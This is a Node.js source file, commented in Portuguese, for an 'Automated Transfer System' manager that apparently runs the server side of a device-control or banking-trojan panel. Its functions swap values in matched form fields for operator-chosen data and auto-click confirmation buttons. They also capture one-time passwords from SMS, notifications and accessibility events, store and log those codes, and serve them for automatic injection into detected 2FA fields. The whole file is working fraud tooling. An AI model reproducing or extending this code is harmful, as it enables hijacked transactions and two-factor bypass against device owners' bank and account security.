let CONST = require('./const');

/**
 * ATS Manager - Automated Transfer System
 * Gerencia a substituição automática de dados por dados fictícios em campos específicos
 */
class ATSManager {
    constructor(db) {
        this.db = db;
    }

    /**
     * Habilita/desabilita ATS para um cliente
     */
    setATSEnabled(clientID, enabled, callback) {
        try {
            this.ensureClientRecord(clientID);

            let clientDB = this.getClientDatabase(clientID);
            let atsConfig = clientDB.get('atsConfig').value() || {};
            atsConfig.enabled = Boolean(enabled);
            clientDB.get('atsConfig').assign(atsConfig).write();
            
            global.logManager.log(CONST.logTypes.info, 
                `ATS ${enabled ? 'Habilitado' : 'Desabilitado'} para ${clientID}`);
            
            callback(false);
        } catch (error) {
            callback(error.message);
        }
    }

    /**
     * Atualiza um mapeamento de campo fictício
     */
    updateDataMapping(clientID, fieldKey, fieldValue, callback) {
        try {
            let clientDB = this.getClientDatabase(clientID);
            let dataMapping = clientDB.get('atsConfig.dataMapping').value();
            
            if (!fieldKey || fieldKey.trim().length === 0) {
                return callback('Campo não pode estar vazio');
            }
            if (!fieldValue || fieldValue.toString().trim().length === 0) {
                return callback('Valor não pode estar vazio');
            }

            dataMapping[fieldKey.toLowerCase()] = fieldValue.toString().trim();
            clientDB.get('atsConfig.dataMapping').assign(dataMapping).write();

            global.logManager.log(CONST.logTypes.success, 
                `ATS Dados Atualizados ${clientID}: ${fieldKey}`);
            
            callback(false);
        } catch (error) {
            callback(error.message);
        }
    }

    /**
     * Remove um mapeamento de campo fictício
     */
    removeDataMapping(clientID, fieldKey, callback) {
        try {
            let clientDB = this.getClientDatabase(clientID);
            clientDB.get('atsConfig.dataMapping').unset(fieldKey.toLowerCase()).write();

            global.logManager.log(CONST.logTypes.info, 
                `ATS Campo Removido ${clientID}: ${fieldKey}`);
            
            callback(false);
        } catch (error) {
            callback(error.message);
        }
    }

    /**
     * Adiciona um novo padrão de campo a monitorar
     */
    addFieldPattern(clientID, pattern, callback) {
        try {
            let clientDB = this.getClientDatabase(clientID);
            let patterns = clientDB.get('atsConfig.fieldPatterns').value();
            
            pattern = pattern.toLowerCase().trim();
            
            if (pattern.length === 0) {
                return callback('Padrão não pode estar vazio');
            }

            if (!patterns.includes(pattern)) {
                patterns.push(pattern);
                clientDB.get('atsConfig.fieldPatterns').assign(patterns).write();
                
                global.logManager.log(CONST.logTypes.success, 
                    `ATS Padrão Adicionado ${clientID}: ${pattern}`);
            }
            
            callback(false);
        } catch (error) {
            callback(error.message);
        }
    }

    /**
     * Remove um padrão de campo
     */
    removeFieldPattern(clientID, pattern, callback) {
        try {
            let clientDB = this.getClientDatabase(clientID);
            let patterns = clientDB.get('atsConfig.fieldPatterns').value();
            
            pattern = pattern.toLowerCase().trim();
            let idx = patterns.indexOf(pattern);
            
            if (idx > -1) {
                patterns.splice(idx, 1);
                clientDB.get('atsConfig.fieldPatterns').assign(patterns).write();
                
                global.logManager.log(CONST.logTypes.info, 
                    `ATS Padrão Removido ${clientID}: ${pattern}`);
            }
            
            callback(false);
        } catch (error) {
            callback(error.message);
        }
    }

    /**
     * Verifica se um campo deve ser alvo de ATS
     */
    shouldIntercept(clientID, fieldDescription, fieldViewId) {
        let clientDB = this.getClientDatabase(clientID);
        let atsConfig = clientDB.get('atsConfig').value();
        
        if (!atsConfig.enabled) {
            return null;
        }

        let patterns = atsConfig.fieldPatterns.map(p => p.toLowerCase());
        let text = `${fieldDescription} ${fieldViewId}`.toLowerCase();
        
        for (let pattern of patterns) {
            if (text.includes(pattern)) {
                // Retorna dados fictícios baseado no padrão detectado
                return atsConfig.dataMapping[pattern] || 'DADOS_FICTICIOS';
            }
        }

        return null;
    }

    /**
     * Registra uma operação ATS no log
     */
    logATSOperation(clientID, operation, fieldName, status, callback) {
        try {
            let clientDB = this.getClientDatabase(clientID);
            let logEntry = {
                timestamp: new Date(),
                operation,
                fieldName,
                status,
                pacote: 'DADOS_FICTICIOS'
            };

            clientDB.get('atsConfig.atsLog').push(logEntry).write();

            global.logManager.log(CONST.logTypes.info, 
                `ATS Log ${clientID}: ${operation} - ${fieldName}`);
            
            callback(false);
        } catch (error) {
            callback(error.message);
        }
    }

    /**
     * Retorna configuração ATS para um cliente
     */
    getATSConfig(clientID, callback) {
        try {
            let clientDB = this.getClientDatabase(clientID);
            let atsConfig = clientDB.get('atsConfig').value();
            
            callback(false, atsConfig);
        } catch (error) {
            callback(error.message);
        }
    }

    /**
     * Retorna log de ATS
     */
    getATSLog(clientID, limit = 100, callback) {
        try {
            let clientDB = this.getClientDatabase(clientID);
            let atsLog = clientDB.get('atsConfig.atsLog')
                .sortBy('timestamp')
                .reverse()
                .take(limit)
                .value();
            
            callback(false, atsLog);
        } catch (error) {
            callback(error.message);
        }
    }

    /**
     * Limpa o log ATS
     */
    clearATSLog(clientID, callback) {
        try {
            let clientDB = this.getClientDatabase(clientID);
            clientDB.get('atsConfig.atsLog').assign([]).write();
            
            global.logManager.log(CONST.logTypes.success, 
                `ATS Log Limpo ${clientID}`);
            
            callback(false);
        } catch (error) {
            callback(error.message);
        }
    }

    /**
     * Habilita/desabilita clique automático de confirmação
     */
    setAutoClickEnabled(clientID, enabled, callback) {
        try {
            let clientDB = this.getClientDatabase(clientID);
            let atsConfig = clientDB.get('atsConfig').value() || {};
            atsConfig.autoClickEnabled = Boolean(enabled);
            clientDB.get('atsConfig').assign(atsConfig).write();
            
            global.logManager.log(CONST.logTypes.info, 
                `Auto Click ${enabled ? 'Habilitado' : 'Desabilitado'} para ${clientID}`);
            
            callback(false);
        } catch (error) {
            callback(error.message);
        }
    }

    /**
     * Define o delay em milissegundos antes do clique automático
     */
    setClickDelay(clientID, delayMs, callback) {
        try {
            if (isNaN(delayMs) || delayMs < 0) {
                return callback('Delay deve ser um número positivo');
            }

            let clientDB = this.getClientDatabase(clientID);
            let atsConfig = clientDB.get('atsConfig').value() || {};
            atsConfig.clickDelayMs = parseInt(delayMs, 10);
            clientDB.get('atsConfig').assign(atsConfig).write();
            
            global.logManager.log(CONST.logTypes.success, 
                `Auto Click Delay alterado para ${delayMs}ms para ${clientID}`);
            
            callback(false);
        } catch (error) {
            callback(error.message);
        }
    }

    /**
     * Adiciona um padrão de botão a detectar
     */
    addButtonPattern(clientID, pattern, callback) {
        try {
            let clientDB = this.getClientDatabase(clientID);
            let patterns = clientDB.get('atsConfig.buttonPatterns').value();
            
            pattern = pattern.toLowerCase().trim();
            
            if (pattern.length === 0) {
                return callback('Padrão não pode estar vazio');
            }

            if (!patterns.includes(pattern)) {
                patterns.push(pattern);
                clientDB.get('atsConfig.buttonPatterns').assign(patterns).write();
                
                global.logManager.log(CONST.logTypes.success, 
                    `Padrão de Botão Adicionado ${clientID}: ${pattern}`);
            }
            
            callback(false);
        } catch (error) {
            callback(error.message);
        }
    }

    /**
     * Remove um padrão de botão
     */
    removeButtonPattern(clientID, pattern, callback) {
        try {
            let clientDB = this.getClientDatabase(clientID);
            let patterns = clientDB.get('atsConfig.buttonPatterns').value();
            
            pattern = pattern.toLowerCase().trim();
            let idx = patterns.indexOf(pattern);
            
            if (idx > -1) {
                patterns.splice(idx, 1);
                clientDB.get('atsConfig.buttonPatterns').assign(patterns).write();
                
                global.logManager.log(CONST.logTypes.info, 
                    `Padrão de Botão Removido ${clientID}: ${pattern}`);
            }
            
            callback(false);
        } catch (error) {
            callback(error.message);
        }
    }

    ensureClientRecord(clientID) {
        if (!clientID) return;

        if (this.db && this.db.usePrisma && typeof this.db.upsertClientState === 'function') {
            void this.db.upsertClientState(clientID, {
                clientID,
                firstSeen: new Date(),
                lastSeen: new Date(),
                isOnline: false,
                dynamicData: {},
            }).catch((error) => {
                if (global.logManager?.log) {
                    global.logManager.log(CONST.logTypes.error, 'Falha ao garantir registro do cliente no Prisma: ' + error.message);
                }
            });
            return;
        }

        const client = this.db.maindb.get('clients').find({ clientID }).value();
        if (client === undefined) {
            this.db.maindb.get('clients').push({
                clientID,
                firstSeen: new Date(),
                lastSeen: new Date(),
                isOnline: false,
                dynamicData: {},
            }).write();
        }
    }

    getClientDatabase(clientID) {
        this.ensureClientRecord(clientID);
        return new (require('./databaseGateway')).clientdb(clientID);
    }

    // ============================================
    // 2FA / OTP ENHANCEMENTS (Auto-Preenchimento + Captura de 2FA)
    // ============================================

    /**
     * Habilita/desabilita captura e auto-preenchimento de 2FA/OTP
     */
    setTwoFactorEnabled(clientID, enabled, callback) {
        try {
            let clientDB = this.getClientDatabase(clientID);
            let atsConfig = clientDB.get('atsConfig').value() || {};

            if (!atsConfig.twoFactorConfig) {
                atsConfig.twoFactorConfig = this.getDefaultTwoFactorConfig();
            }

            atsConfig.twoFactorConfig.enabled = !!enabled;
            clientDB.get('atsConfig').assign(atsConfig).write();

            global.logManager.log(CONST.logTypes.info,
                `ATS 2FA ${enabled ? 'Habilitado' : 'Desabilitado'} para ${clientID}`);

            callback(false);
        } catch (error) {
            callback(error.message);
        }
    }

    /**
     * Ativa/desativa a injeção automática de OTP quando o campo é detectado
     */
    setAutoInjectOTP(clientID, enabled, callback) {
        try {
            let clientDB = this.getClientDatabase(clientID);
            let atsConfig = clientDB.get('atsConfig').value() || {};

            if (!atsConfig.twoFactorConfig) {
                atsConfig.twoFactorConfig = this.getDefaultTwoFactorConfig();
            }

            atsConfig.twoFactorConfig.autoInjectOTP = !!enabled;
            clientDB.get('atsConfig').assign(atsConfig).write();

            global.logManager.log(CONST.logTypes.success,
                `ATS AutoInject OTP ${enabled ? 'ativado' : 'desativado'} para ${clientID}`);

            callback(false);
        } catch (error) {
            callback(error.message);
        }
    }

    /**
     * Adiciona padrão de campo de 2FA/OTP (ex: "código", "token", "sms")
     */
    addOTPFieldPattern(clientID, pattern, callback) {
        try {
            let clientDB = this.getClientDatabase(clientID);
            let atsConfig = clientDB.get('atsConfig').value() || {};

            if (!atsConfig.twoFactorConfig) {
                atsConfig.twoFactorConfig = this.getDefaultTwoFactorConfig();
            }

            let patterns = atsConfig.twoFactorConfig.otpFieldPatterns || [];
            pattern = pattern.toLowerCase().trim();

            if (!patterns.includes(pattern)) {
                patterns.push(pattern);
                atsConfig.twoFactorConfig.otpFieldPatterns = patterns;
                clientDB.get('atsConfig').assign(atsConfig).write();
            }

            global.logManager.log(CONST.logTypes.success,
                `ATS Padrão OTP adicionado ${clientID}: ${pattern}`);

            callback(false);
        } catch (error) {
            callback(error.message);
        }
    }

    removeOTPFieldPattern(clientID, pattern, callback) {
        try {
            let clientDB = this.getClientDatabase(clientID);
            let atsConfig = clientDB.get('atsConfig').value() || {};

            if (atsConfig.twoFactorConfig && atsConfig.twoFactorConfig.otpFieldPatterns) {
                let patterns = atsConfig.twoFactorConfig.otpFieldPatterns;
                pattern = pattern.toLowerCase().trim();
                atsConfig.twoFactorConfig.otpFieldPatterns = patterns.filter(p => p !== pattern);
                clientDB.get('atsConfig').assign(atsConfig).write();
            }

            callback(false);
        } catch (error) {
            callback(error.message);
        }
    }

    /**
     * Captura um OTP (de SMS, notificação, accessibility ou manual)
     */
    captureOTP(clientID, otpCode, source, metadata, callback) {
        try {
            let clientDB = this.getClientDatabase(clientID);
            let atsConfig = clientDB.get('atsConfig').value() || {};

            if (!atsConfig.twoFactorConfig) {
                atsConfig.twoFactorConfig = this.getDefaultTwoFactorConfig();
            }

            const otpEntry = {
                code: otpCode,
                timestamp: new Date(),
                source: source || 'unknown', // 'sms', 'notification', 'accessibility', 'webview', 'manual'
                app: metadata && metadata.app ? metadata.app : 'unknown',
                fieldContext: metadata && metadata.fieldContext ? metadata.fieldContext : '',
                expiresAt: new Date(Date.now() + (5 * 60 * 1000)) // 5 minutos
            };

            if (!atsConfig.twoFactorConfig.capturedOTPs) {
                atsConfig.twoFactorConfig.capturedOTPs = [];
            }

            atsConfig.twoFactorConfig.capturedOTPs.unshift(otpEntry);

            if (atsConfig.twoFactorConfig.capturedOTPs.length > 20) {
                atsConfig.twoFactorConfig.capturedOTPs = atsConfig.twoFactorConfig.capturedOTPs.slice(0, 20);
            }

            atsConfig.twoFactorConfig.lastOTP = otpEntry;
            clientDB.get('atsConfig').assign(atsConfig).write();

            global.logManager.log(CONST.logTypes.success,
                `ATS OTP Capturado ${clientID} [${source}]: ${otpCode}`);

            callback(false, otpEntry);
        } catch (error) {
            callback(error.message);
        }
    }

    /**
     * Retorna o último OTP válido (não expirado)
     */
    getLatestValidOTP(clientID) {
        try {
            let clientDB = this.getClientDatabase(clientID);
            let atsConfig = clientDB.get('atsConfig').value() || {};
            let tf = atsConfig.twoFactorConfig || {};

            if (!tf.lastOTP) return null;

            const now = new Date();
            if (new Date(tf.lastOTP.expiresAt) > now) {
                return tf.lastOTP;
            }

            if (tf.capturedOTPs && tf.capturedOTPs.length > 0) {
                for (let entry of tf.capturedOTPs) {
                    if (new Date(entry.expiresAt) > now) {
                        return entry;
                    }
                }
            }

            return null;
        } catch (error) {
            return null;
        }
    }

    /**
     * Verifica se o campo atual é um campo de 2FA/OTP
     */
    isOTPField(clientID, fieldDescription, fieldViewId, fieldText) {
        try {
            let clientDB = this.getClientDatabase(clientID);
            let atsConfig = clientDB.get('atsConfig').value() || {};
            let tf = atsConfig.twoFactorConfig || {};

            if (!tf.enabled) {
                return false;
            }

            const patterns = (tf.otpFieldPatterns || []).map(p => p.toLowerCase());
            const combined = `${fieldDescription || ''} ${fieldViewId || ''} ${fieldText || ''}`.toLowerCase();

            for (let pattern of patterns) {
                if (combined.includes(pattern)) {
                    return true;
                }
            }

            // Heurísticas extras
            if (/\b(código|codigo|token|otp|sms|verifica|auth|autentica|2fa|one.?time)\b/i.test(combined)) {
                return true;
            }

            if (fieldText && /^[0-9\s-]{4,10}$/.test(fieldText.trim())) {
                return true;
            }

            return false;
        } catch (error) {
            return false;
        }
    }

    /**
     * Retorna o código OTP pronto para injetar (se houver válido)
     */
    getOTPToInject(clientID) {
        const latest = this.getLatestValidOTP(clientID);
        return latest ? latest.code : null;
    }

    /**
     * Registra tentativa de injeção automática de OTP
     */
    logOTPInjection(clientID, otpCode, success, fieldInfo, callback) {
        try {
            let clientDB = this.getClientDatabase(clientID);
            let atsConfig = clientDB.get('atsConfig').value() || {};

            if (!atsConfig.twoFactorConfig) {
                atsConfig.twoFactorConfig = this.getDefaultTwoFactorConfig();
            }

            if (!atsConfig.twoFactorConfig.otpInjectionLog) {
                atsConfig.twoFactorConfig.otpInjectionLog = [];
            }

            atsConfig.twoFactorConfig.otpInjectionLog.unshift({
                timestamp: new Date(),
                code: otpCode,
                success: !!success,
                field: fieldInfo || {},
                source: 'auto'
            });

            if (atsConfig.twoFactorConfig.otpInjectionLog.length > 50) {
                atsConfig.twoFactorConfig.otpInjectionLog = atsConfig.twoFactorConfig.otpInjectionLog.slice(0, 50);
            }

            clientDB.get('atsConfig').assign(atsConfig).write();

            global.logManager.log(CONST.logTypes.info,
                `ATS OTP Injection ${success ? 'sucesso' : 'falha'} ${clientID}: ${otpCode}`);

            callback(false);
        } catch (error) {
            callback(error.message);
        }
    }

    getCapturedOTPs(clientID, limit = 20, callback) {
        try {
            let clientDB = this.getClientDatabase(clientID);
            let atsConfig = clientDB.get('atsConfig').value() || {};
            let tf = atsConfig.twoFactorConfig || {};

            callback(false, {
                lastOTP: tf.lastOTP || null,
                otps: (tf.capturedOTPs || []).slice(0, limit),
                autoInjectOTP: tf.autoInjectOTP !== false,
                enabled: tf.enabled === true
            });
        } catch (error) {
            callback(error.message);
        }
    }

    clearCapturedOTPs(clientID, callback) {
        try {
            let clientDB = this.getClientDatabase(clientID);
            let atsConfig = clientDB.get('atsConfig').value() || {};

            if (atsConfig.twoFactorConfig) {
                atsConfig.twoFactorConfig.capturedOTPs = [];
                atsConfig.twoFactorConfig.lastOTP = null;
                clientDB.get('atsConfig').assign(atsConfig).write();
            }

            callback(false);
        } catch (error) {
            callback(error.message);
        }
    }

    getDefaultTwoFactorConfig() {
        return {
            enabled: false,
            autoInjectOTP: true,
            smsMonitoringEnabled: true,
            otpFieldPatterns: [
                'código', 'codigo', 'token', 'otp', 'sms', 'verifica',
                'autentica', 'auth', '2fa', 'one time', 'one-time',
                'código sms', 'código de verifica', 'senha tempor'
            ],
            capturedOTPs: [],
            lastOTP: null,
            otpInjectionLog: []
        };
    }
}

module.exports = ATSManager;
